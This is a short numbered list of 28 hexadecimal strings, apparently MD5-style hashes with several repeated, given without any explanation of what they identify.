    02  0b0c4dbc527ee3154877e070d043cd0d
    03  987346e7f810d2b616da385b0c2549ec
    04  49fec950691bbeba1b0d33d5a48d0293
    05  0b0c4dbc527ee3154877e070d043cd0d
    06  333eda93ecfba8d60c57be7f59b14c62
    07  49fec950691bbeba1b0d33d5a48d0293
    08  cdf2b153a374773dc94ee74d14610428
    09  cdf2b153a374773dc94ee74d14610428
    10  a6687f8a2a0a6dfd7c054d63c0568e61
    11  3cf736e35d2a54f1b0c3345005d3f962
    12  cdf2b153a374773dc94ee74d14610428
    13  50f935f7e1b88f89fba60ed23c8d115c
    14  3cf736e35d2a54f1b0c3345005d3f962
    15  06c616b2109569ddd69c8fc00c6a413c
    16  06c616b2109569ddd69c8fc00c6a413c
    17  179b9c2fd5a34cbb6013df534bf05726
    18  5f217f838649436f34bbf13ccb127f44
    19  3564c9de46ad690b83268cde43c21854
    20  1caa9da91c85a1e176fb85cdefc57587
    21  27b7de3c5a16e7629659152656022831
    22  27b7de3c5a16e7629659152656022831
    23  65f5f95db76e43bd6c4ad216b7577604
    24  026c59a45699b631621233cb38733174
    25  026c59a45699b631621233cb38733174
    26  342a52ec1d3b39d90af55460bcda72e8
    27  ef1e1a688748f79d16e8e32318f51465
    28  9e93ee8e0bcccb1451face3dba22cc69
    29  480da975c1dfc76717a63edc6bb29d7b
```